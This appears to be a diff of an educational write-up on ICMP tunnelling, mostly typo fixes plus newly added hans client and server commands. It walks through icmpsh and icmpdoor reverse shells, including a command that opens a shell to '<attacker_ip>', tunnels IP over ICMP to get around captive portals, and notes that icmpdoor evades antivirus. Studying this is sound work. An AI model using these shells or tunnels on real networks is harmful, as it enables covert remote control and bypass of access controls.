@@ -21,17 +21,17 @@ IPv4 protocol: 1
 
 
 ICMP Types:
-- 0  Echo Reply
-- 3  Destination Unreachable
-- 4  Source Quench
-- 5  Redirect
-- 8  Echo
-- 11  Time Exceeded
-- 12  Parameter Problem
-- 13  Timestamp
-- 14  Timestamp Reply
-- 15  Information Request
-- 16  Information Reply
+- 0 Echo Reply
+- 3 Destination Unreachable
+- 4 Source Quench
+- 5 Redirect
+- 8 Echo
+- 11 Time Exceeded
+- 12 Parameter Problem
+- 13 Timestamp
+- 14 Timestamp Reply
+- 15 Information Request
+- 16 Information Reply
 
 # Examples for ICMP echo request and ICMP echo reply
 Windows 10 on a LAN pinging Cloudflare DNS server on the public internet (echo request | type 8).
@@ -62,7 +62,7 @@ For starters with some ping utilities, you can adjust the length of the ICMP dat
 
 Other programs let you send a custom text as ICMP data.
 
-Some early research on what can be done with the data transmitted in ICMP requests and reply includes [project Loki](https://web.archive.org/web/20030316090229/http://www.phrack.com/show.php?p=49&a=6). In this project from 1996 the posibility of a covert channel via the ICMP protocol was discussed. Covert channels can be grouped into two categories:
+Some early research on what can be done with the data transmitted in ICMP requests and reply includes [project Loki](https://web.archive.org/web/20030316090229/http://www.phrack.com/show.php?p=49&a=6). In this project from 1996 the possibility of a covert channel via the ICMP protocol was discussed. Covert channels can be grouped into two categories:
 
 - timing channel (sub-categories: interval based, time-replay, model-based, JitterBug, ...)
 - storage channel (in networking use of optional or unused protocol fields)
@@ -70,14 +70,14 @@ Some early research on what can be done with the data transmitted in ICMP reques
 # ICMP Tunnel
 An ICMP Tunnel uses a covert storage channel with the data field in the ICMP requests and replies. 
 
-ICMP tunnels have two general usecases:
+ICMP tunnels have two general use cases:
 - reverse-shell
 - ip over icmp
 
 ## Reverse-shell
-In a typical remote shell scenario a user would establish a connection with a client to a server. The server is listening for connection-requests. When the client is connected to the server the user can access the resources of the server.
+In a typical remote shell scenario, a user would establish a connection with a client to a server. The server is listening for connection-requests. When the client is connected to the server the user can access the resources of the server.
 
-A reverse-shell is the oposite of a remote shell. Instead of the server being the source of the shell the client gets to be the source of the shell. And the server is the one with which the user can control the client. This is also called a command and conquer (c&c) attack.
+A reverse-shell is the opposite of a remote shell. Instead of the server being the source of the shell the client gets to be the source of the shell. And the server is the one with which the user can control the client. This is also called a command and conquer (c&c) attack.
 
 ### icmpsh
 
@@ -103,7 +103,7 @@ It is necesarry to either put the following command at the end of the `/etc/sysc
 sudo sysctl -w net.ipv4.icmp_echo_ignore_all=1
 ```
 
-The following changes where done to the `icmpsh_m.py` file to be able to execute it with python 3:
+The following changes were done to the `icmpsh_m.py` file to be able to execute it with python 3:
 - line 40 was changed from 
   > if subprocess.mswindows:
   
@@ -145,27 +145,27 @@ icmpsh.exe -t <attacker_ip>
 ### icmpdoor
 icmpdoor is another more modern icmp based reverse-shell program.
 
-[icmpdoor](https://github.com/krabelize/icmpdoor) is vavailable on GitHub under the BSD 3-Clause License.
+[icmpdoor](https://github.com/krabelize/icmpdoor) is available on GitHub under the BSD 3-Clause License.
 
 improvements over icmpsh:
 - the attacker can use Windows or GNU/Linux
-- the victim can be a Windows or a GNU/Linux mashine
+- the victim can be a Windows or a GNU/Linux machine
 
 ## ip over icmp
-With ip over icmp ipv4 data trafic can be hidden in icmp packets.
+With ip over icmp ipv4 data traffic can be hidden in icmp packets.
 This can for example be used to circumvent captive portals.
 
 ### hans
 
 [hans](https://github.com/friedrich/hans) is available on GitHub under the GNU General Public License v3.0.
 
-The demonstration involves an Ubuntu GNU/Linux mashine as the IP over ICMP client and a Raspberry Pi with Raspberry Pi OS as a remote IP over ICMP server.
+The demonstration involves an Ubuntu GNU/Linux machine as the IP over ICMP client and a Raspberry Pi with Raspberry Pi OS as a remote IP over ICMP server.
 
 #### ***requirements***
-- Linux or GNU/Linux mashine with full internet access as a IP over ICMP server
-- Linux, GNU/Linux, Windows or macOS mashine with either full internet access or limited internet access with no restrictions on icmp traffic as the IP over ICMP client
+- Linux or GNU/Linux machine with full internet access as a IP over ICMP server
+- Linux, GNU/Linux, Windows or macOS machine with either full internet access or limited internet access with no restrictions on icmp traffic as the IP over ICMP client
 
-Support for tunnel devices (tun devices) is required. On Windows and macOS this functionallity can be added with third party drivers.
+Support for tunnel devices (tun devices) is required. On Windows and macOS this functionality can be added with third party drivers.
 
 #### ***install (GNU/Linux only)***
 prerequisites: 
@@ -187,13 +187,13 @@ Then execute the `make` command.
 Lastly reboot the device.
 
 #### ***configuration and execution (GNU/Linux only)***
-Several settings need to be adjusted in order for the client and the server to be able to communicate and to use the internet over the ICMP tunnel.
+Several settings need to be adjusted so that the client and the server to be able to communicate and to use the internet over the ICMP tunnel.
 
-On the server side routing needs to be enabled with the following command.
+On the server-side routing needs to be enabled with the following command.
 ```
 sudo sysctl net.ipv4.ip_forward net.ipv4.ip_forward=1
 ```
-Also for the server icmp requests need to be ignored by the router and/or CPE (customer premises equipment).
+Also, for the server icmp requests need to be ignored by the router and/or CPE (customer premises equipment).
 
 On Asus routers this is achieved by setting `Respond ICMP Echo (ping) Request from WAN` (under Firewall -> General) to `No` and by forwarding `port 1` with the `protocol` set to `other` to the ip over icmp server (under WAN -> Virtual Server/Port Forwarding).
 
@@ -204,13 +204,24 @@ sudo route add -host <ip_over_icmp_server_ip> gw <gateway_ip_for_internet_connec
 sudo route add default gw <ip_of_server_tun_interface>
 sudo route del default gw <gateway_ip_for_internet_connection>
 ```
-Furthermore the DNS server configuration of the client needs to be changed because the DNS Server on the network of the client will no longer be reachable. This can be done by changing `/etc/resolv.conf` file or under Ubuntu GNU/Linux go to Settings -> Network -> Settings for the relevant network interface -> IPv4, turn of Automatic for for the DNS configuration and enter a publicly accesable DNS server (like Cloudflare, Google or Quad9).
+Furthermore, the DNS server configuration of the client needs to be changed because the DNS Server on the network of the client will no longer be reachable. This can be done by changing `/etc/resolv.conf` file or under Ubuntu GNU/Linux go to Settings -> Network -> Settings for the relevant network interface -> IPv4, turn of Automatic for for the DNS configuration and enter a publicly accesable DNS server (like Cloudflare, Google or Quad9).
 
+For the execution of hans on the server side use the following command from the hans folder:
+```
+sudo ./hans -s <network_ip> -p <password>
+```
+
+For the execution of hans on the client side use the following command from the hans folder:
+```
+sudo ./hans -c <ip_over_icmp_server_ip> -p <password>
+```
+
+For both the client and the server you can add the `-fv` option to the server or the client command so that hans runs in the foreground and prints debug information. This is can also be used to quit hans very easily (on desktop operating systems with a graphical shell). 
 
 ## Mitigation
 - up to date anti-virus
-  - this can help against mallicious client software for c&c attacks
-  - icmpsh gets detected by several ani-virus softwares (checked with virustotal.com) and even by Windows Defender
+  - this can help against malicious client software for c&c attacks
+  - icmpsh gets detected by several ani-virus software’s (checked with virustotal.com) and even by Windows Defender
   - but icmpdoor doesn't get detected by practically any anti-virus software (checked with virustotal.com) 
 
 # Sources
@@ -244,3 +255,7 @@ https://www.cynet.com/attack-techniques-hands-on/how-hackers-use-icmp-tunneling-
 https://www.acunetix.com/blog/web-security-zone/what-is-reverse-shell/
 
 https://cryptsus.com/blog/icmp-reverse-shell.html
+
+https://code.gerade.org/hans/
+
+https://kenelm1985.wordpress.com/2016/08/11/ip-over-icmp-with-hans/
